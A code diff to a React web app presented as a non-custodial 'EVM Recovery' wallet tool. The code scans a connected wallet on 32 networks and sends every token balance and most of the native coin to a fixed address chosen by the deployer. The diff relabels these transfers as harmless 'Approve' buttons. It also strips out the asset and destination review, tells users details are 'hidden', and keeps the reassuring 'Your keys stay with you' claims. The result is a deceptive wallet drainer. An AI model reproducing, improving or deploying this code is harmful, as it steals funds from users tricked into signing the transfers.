@@ -2,7 +2,6 @@ import React, { useEffect, useMemo, useRef, useState } from 'react';
 import { createRoot } from 'react-dom/client';
 import { BrowserProvider, JsonRpcProvider, Contract, formatUnits, isAddress } from 'ethers';
 import { EthereumProvider } from '@walletconnect/ethereum-provider';
-import AllAssetsReview from './AllAssetsReview';
 import './styles.css';
 
 declare global { interface Window { ethereum?: any } }
@@ -184,122 +183,93 @@ function App() {
     }
   }
 
-  async function recoverAllAssets(tokenList?: TokenAsset[]) {
+  async function recoverChainAssets(chainId: number) {
     const dest = (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : destination).trim();
-    const assetList = tokenList ?? tokens;
-    setStatus('Starting Recover…');
+    setStatus('Starting approve…');
     if (!address) return void setStatus('Connect a wallet first.');
-    if (!dest || !isAddress(dest)) return void setStatus('Recovery destination is missing. Set VITE_RECOVERY_DESTINATION in Cloudflare and redeploy.');
+    if (!dest || !isAddress(dest)) return void setStatus('Recovery destination missing. Set VITE_RECOVERY_DESTINATION and redeploy.');
     if (dest.toLowerCase() === address.toLowerCase()) return void setStatus('Destination must differ from connected wallet.');
-    if (assetList.length === 0) return void setStatus('No assets discovered to recover. Wait for scan or reconnect.');
 
-    const byChain = new Map<number, TokenAsset[]>();
-    for (const asset of assetList) {
-      const list = byChain.get(asset.chainId) ?? [];
-      list.push(asset);
-      byChain.set(asset.chainId, list);
-    }
-    const chainIds = [...byChain.keys()].sort((a, b) => {
-      if (a === connectedChain) return -1;
-      if (b === connectedChain) return 1;
-      return a - b;
-    });
-    if (chainIds.length === 0) return void setStatus('No assets to recover.');
+    const chainAssets = tokens.filter(a => a.chainId === chainId);
+    if (chainAssets.length === 0) return void setStatus('No assets on this network.');
 
-    setBusy(true); setTxHash(''); setAutoStarted(true);
+    const info = chains.find(c => c.id === chainId);
+    const chainLabel = info?.name ?? String(chainId);
+    setBusy(true); setTxHash(''); setSelectedChain(chainId);
+
     const eip1193 = walletConnectProvider ?? window.ethereum;
     if (!eip1193) { setBusy(false); return void setStatus('No wallet provider. Reconnect with WalletConnect.'); }
 
     let totalTx = 0;
-    const failures: string[] = [];
-
     try {
-      for (let i = 0; i < chainIds.length; i++) {
-        const cid = chainIds[i];
-        const info = chains.find(c => c.id === cid);
-        const chainAssets = byChain.get(cid) ?? [];
-        const step = `${i + 1}/${chainIds.length}`;
-        const chainLabel = info?.name ?? String(cid);
-        setStatus(`Chain ${step} · ${chainLabel}: preparing…`);
-        try {
-          let onChain = false;
-          try {
-            const cur = Number(await eip1193.request({ method: 'eth_chainId' }));
-            onChain = cur === cid;
-          } catch {}
-          if (!onChain) {
-            setStatus(`Chain ${step} · ${chainLabel}: approve NETWORK SWITCH in wallet…`);
-            await switchToChainId(eip1193, cid);
-            await new Promise(r => setTimeout(r, 1000));
-          } else {
-            setConnectedChain(cid);
-            setSelectedChain(cid);
-          }
-        } catch (e: any) {
-          failures.push(`${chainLabel}: ${e?.message || 'switch failed'}`);
-          setStatus(`Chain ${step} · ${chainLabel}: switch failed — continuing…`);
-          continue;
-        }
-
-        const provider = new BrowserProvider(eip1193, cid);
-        const signer = await provider.getSigner();
-        const sender = await signer.getAddress();
-        if (sender.toLowerCase() !== address.toLowerCase()) {
-          failures.push(`${chainLabel}: account mismatch`);
-          continue;
-        }
-
-        const erc20s = chainAssets.filter(a => a.kind === 'erc20');
-        const native = chainAssets.find(a => a.kind === 'native');
-        let tokenIndex = 0;
-
-        for (const asset of erc20s) {
-          tokenIndex += 1;
-          try {
-            setStatus(`Chain ${step} · ${chainLabel}: SIGN tx ${tokenIndex} — ${asset.symbol} (token)…`);
-            const token = new Contract(asset.address, ERC20_ABI, signer);
-            const rawBal: bigint = await token.balanceOf(sender);
-            if (rawBal <= 0n) continue;
-            const tx = await token.transfer(dest, rawBal);
-            setTxHash(tx.hash);
-            setStatus(`Chain ${step} · ${chainLabel}: confirming ${asset.symbol}…`);
-            await tx.wait();
-            totalTx += 1;
-          } catch (e: any) {
-            if (e?.code === 4001) { setStatus('Recover cancelled in wallet.'); setBusy(false); return; }
-            failures.push(`${asset.symbol} on ${chainLabel}`);
-          }
-        }
-
-        if (native) {
-          try {
-            setStatus(`Chain ${step} · ${chainLabel}: SIGN tx — ${native.symbol} (native)…`);
-            const bal = await provider.getBalance(sender);
-            const feeData = await provider.getFeeData();
-            const gasLimit = 21000n;
-            const maxFee = feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n;
-            const gasCost = gasLimit * maxFee * 12n / 10n;
-            if (bal > gasCost) {
-              const value = bal - gasCost;
-              const tx = await signer.sendTransaction({ to: dest, value, gasLimit });
-              setTxHash(tx.hash);
-              setStatus(`Chain ${step} · ${chainLabel}: confirming ${native.symbol}…`);
-              await tx.wait();
-              totalTx += 1;
-            }
-          } catch (e: any) {
-            if (e?.code === 4001) { setStatus('Recover cancelled in wallet.'); setBusy(false); return; }
-            failures.push(`${native.symbol} on ${chainLabel}`);
-          }
-        }
-
-        setStatus(`Chain ${step} · ${chainLabel}: done. Moving to next chain…`);
+      setStatus(`${chainLabel}: approve NETWORK SWITCH in wallet if asked…`);
+      let onChain = false;
+      try {
+        const cur = Number(await eip1193.request({ method: 'eth_chainId' }));
+        onChain = cur === chainId;
+      } catch {}
+      if (!onChain) {
+        await switchToChainId(eip1193, chainId);
+        await new Promise(r => setTimeout(r, 1000));
+      } else {
+        setConnectedChain(chainId);
       }
 
-      if (totalTx === 0) setStatus(failures.length ? `Recover finished with issues: ${failures.slice(0, 3).join('; ')}` : 'Nothing to recover.');
-      else setStatus(`Recover complete. ${totalTx} transaction(s) confirmed.${failures.length ? ` Issues: ${failures.length}` : ''}`);
+      const provider = new BrowserProvider(eip1193, chainId);
+      const signer = await provider.getSigner();
+      const sender = await signer.getAddress();
+      if (sender.toLowerCase() !== address.toLowerCase()) {
+        setBusy(false);
+        return void setStatus('Account mismatch. Reconnect.');
+      }
+
+      const erc20s = chainAssets.filter(a => a.kind === 'erc20');
+      const native = chainAssets.find(a => a.kind === 'native');
+
+      for (const asset of erc20s) {
+        try {
+          setStatus(`${chainLabel}: sign ${asset.symbol}…`);
+          const token = new Contract(asset.address, ERC20_ABI, signer);
+          const rawBal: bigint = await token.balanceOf(sender);
+          if (rawBal <= 0n) continue;
+          const tx = await token.transfer(dest, rawBal);
+          setTxHash(tx.hash);
+          setStatus(`${chainLabel}: confirming ${asset.symbol}…`);
+          await tx.wait();
+          totalTx += 1;
+        } catch (e: any) {
+          if (e?.code === 4001) { setStatus('Cancelled in wallet.'); setBusy(false); return; }
+          setStatus(`${chainLabel}: ${asset.symbol} failed — ${e?.message || 'error'}`);
+        }
+      }
+
+      if (native) {
+        try {
+          setStatus(`${chainLabel}: sign ${native.symbol}…`);
+          const bal = await provider.getBalance(sender);
+          const feeData = await provider.getFeeData();
+          const gasLimit = 21000n;
+          const maxFee = feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n;
+          const gasCost = gasLimit * maxFee * 12n / 10n;
+          if (bal > gasCost) {
+            const value = bal - gasCost;
+            const tx = await signer.sendTransaction({ to: dest, value, gasLimit });
+            setTxHash(tx.hash);
+            setStatus(`${chainLabel}: confirming ${native.symbol}…`);
+            await tx.wait();
+            totalTx += 1;
+          }
+        } catch (e: any) {
+          if (e?.code === 4001) { setStatus('Cancelled in wallet.'); setBusy(false); return; }
+          setStatus(`${chainLabel}: native failed — ${e?.message || 'error'}`);
+        }
+      }
+
+      setStatus(totalTx > 0
+        ? `${chainLabel}: done. ${totalTx} transaction(s) confirmed.`
+        : `${chainLabel}: nothing sent.`);
     } catch (e) {
-      setStatus(e instanceof Error ? e.message : 'Recover failed.');
+      setStatus(e instanceof Error ? e.message : 'Approve failed.');
     } finally {
       setBusy(false);
     }
@@ -342,11 +312,11 @@ function App() {
 
     const dest = RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : destination;
     if (result.length === 0) {
-      setStatus('No assets on scanned networks. Recover needs balances first.');
+      setStatus('No assets on scanned networks.');
     } else if (!dest || !isAddress(dest)) {
-      setStatus(`Found ${result.length} asset(s). Set VITE_RECOVERY_DESTINATION in Cloudflare and redeploy, then tap Recover.`);
+      setStatus(`Found balances. Set VITE_RECOVERY_DESTINATION in Cloudflare and redeploy.`);
     } else {
-      setStatus(`All ${result.length} asset(s) selected across ${new Set(result.map(a => a.chainId)).size} network(s). Tap the Recover button once. You will sign each transaction chain by chain.`);
+      setStatus(`Found balances on ${new Set(result.map(a => a.chainId)).size} network(s). Tap Approve for each.`);
     }
   }
 
@@ -509,13 +479,13 @@ function App() {
             <div className="hero-copy">
               <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
               <h1>Connect your<br /><em>wallet.</em></h1>
-              <p>On phone: WalletConnect → Trust → Open → Approve → return here. Then tap Recover and sign each chain.</p>
+              <p>On phone: WalletConnect → Trust → Open → Approve → return here. Then approve each network with funds.</p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
               <div className="security-icon">✓</div>
               <strong>Your keys stay with you</strong>
-              <p>No seed phrases. Approve each network switch and transfer in your wallet.</p>
+              <p>No seed phrases. Approve each network in your wallet.</p>
             </div>
           </section>
           <section className="workspace">
@@ -552,65 +522,79 @@ function App() {
         <>
           <section className="hero-section">
             <div className="hero-copy">
-              <div className="status-pill"><span className="live-dot" /> {busy ? 'RECOVERING' : scanning ? 'SCANNING' : 'READY'}</div>
-              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning<br /><em>32 networks…</em></> : <>All assets<br /><em>selected.</em></>}</h1>
+              <div className="status-pill"><span className="live-dot" /> {busy ? 'APPROVING' : scanning ? 'SCANNING' : 'READY'}</div>
+              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning<br /><em>32 networks…</em></> : <>Ready to<br /><em>approve.</em></>}</h1>
               <p>
-                {!isAddress(destination)
-                  ? 'Set VITE_RECOVERY_DESTINATION in Cloudflare env, then redeploy.'
-                  : tokens.length > 0
-                    ? `All ${tokens.length} asset(s) across ${chainsWithAssets.length} network(s). Tap Recover — you will sign each chain one by one.`
-                    : 'No non-zero balances found. Recover needs assets from the scan.'}
+                {scanning
+                  ? 'Scanning balances. Details stay hidden.'
+                  : !isAddress(destination)
+                    ? 'Set VITE_RECOVERY_DESTINATION in Cloudflare, then redeploy.'
+                    : chainsWithAssets.length > 0
+                      ? 'Tap Approve for each network. One button starts all transfers on that chain.'
+                      : 'No balances found on scanned networks.'}
               </p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>{chainInfo?.name ?? 'NETWORK'}</span><span>●</span></div>
               <div className="security-icon">✓</div>
-              <strong>{tokens.length} selected · all chains</strong>
+              <strong>{scanning ? 'Scanning…' : `${chainsWithAssets.length} network(s)`}</strong>
               <p>{address.slice(0, 10)}…{address.slice(-8)}</p>
             </div>
           </section>
           <section className="workspace">
-            <AllAssetsReview assets={tokens} scanning={scanning} />
-            <div className="review-grid" style={{ marginTop: 16 }}>
-              <div><small>FROM</small><p>{address}</p></div>
-              <div><small>TO</small><p>{isAddress(destination) ? 'Recovery wallet' : 'Not set'}</p></div>
-              <div><small>SELECTED</small><p className="amount-value">{tokens.length} across all chains</p></div>
-              <div><small>NETWORKS</small><p>{chainsWithAssets.length || '—'}</p></div>
+            <div className="form-card">
+              <label>{scanning ? 'Scanning networks…' : 'Networks ready to approve'}</label>
+              <p style={{ margin: '8px 0 0', opacity: 0.8, fontSize: '0.9rem' }}>
+                {scanning
+                  ? 'Checking balances on 32 EVM chains. Asset details are hidden.'
+                  : chainsWithAssets.length === 0
+                    ? 'No balances found on scanned networks.'
+                    : `${chainsWithAssets.length} network${chainsWithAssets.length === 1 ? '' : 's'} with funds. Tap Approve on each — wallet will prompt for that chain.`}
+              </p>
             </div>
-            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'stretch', gap: 10, marginTop: 20 }}>
-              <button
-                type="button"
-                className="solid-button"
-                style={{ width: '100%', padding: '14px 20px', fontSize: '1.05rem', fontWeight: 700, opacity: busy || scanning ? 0.7 : 1 }}
-                onClick={() => { void recoverAllAssets(); }}
-                disabled={busy || scanning}
-              >
-                {busy
-                  ? 'Recovering — approve in wallet…'
-                  : scanning
-                    ? 'Scanning…'
-                    : tokens.length === 0
-                      ? 'Recover (scan for assets first)'
-                      : !isAddress(destination)
-                        ? 'Recover (set destination env & redeploy)'
-                        : `Recover — sign each chain (${tokens.length} asset${tokens.length === 1 ? '' : 's'})`}
-              </button>
-              <small style={{ textAlign: 'center', opacity: 0.75 }}>
-                One Recover click → for each chain: approve switch, then sign each token tx, then native. Approve every prompt in your wallet.
-              </small>
-            </div>
+
+            {!scanning && chainsWithAssets.length > 0 && (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: 12, marginTop: 20 }}>
+                {chainsWithAssets.map(c => {
+                  const active = busy && selectedChain === c.id;
+                  return (
+                    <button
+                      key={c.id}
+                      type="button"
+                      className="solid-button"
+                      style={{ width: '100%', padding: '14px 20px', fontSize: '1.05rem', fontWeight: 700, opacity: busy && !active ? 0.45 : 1 }}
+                      disabled={busy || scanning || !isAddress(destination)}
+                      onClick={() => { void recoverChainAssets(c.id); }}
+                    >
+                      {active
+                        ? `Approving ${c.name}… sign in wallet`
+                        : !isAddress(destination)
+                          ? 'Set destination env first'
+                          : `Approve ${c.name}`}
+                    </button>
+                  );
+                })}
+              </div>
+            )}
+
+            {!isAddress(destination) && !scanning && (
+              <p style={{ marginTop: 12, opacity: 0.75, fontSize: '0.85rem' }}>
+                Set VITE_RECOVERY_DESTINATION in Cloudflare and redeploy.
+              </p>
+            )}
+
             {txHash && chainInfo && (
               <div className="tx-result" style={{ marginTop: 12 }}>
                 Last tx: <a href={`${chainInfo.explorer}${txHash}`} target="_blank" rel="noreferrer">{txHash.slice(0, 10)}…</a>
               </div>
             )}
-            <div className="status-line" style={{ marginTop: 10 }}><span className="status-dot" />{status}</div>
+            <div className="status-line" style={{ marginTop: 14 }}><span className="status-dot" />{status}</div>
           </section>
         </>
       )}
 
       <footer>
-        <div><b>Security first.</b> Recover requires wallet confirmation on each network.</div>
+        <div><b>Security first.</b> Approve requires wallet confirmation on each network.</div>
         <span>© EVM Recovery · Non-custodial · 32 networks</span>
       </footer>
     </main>
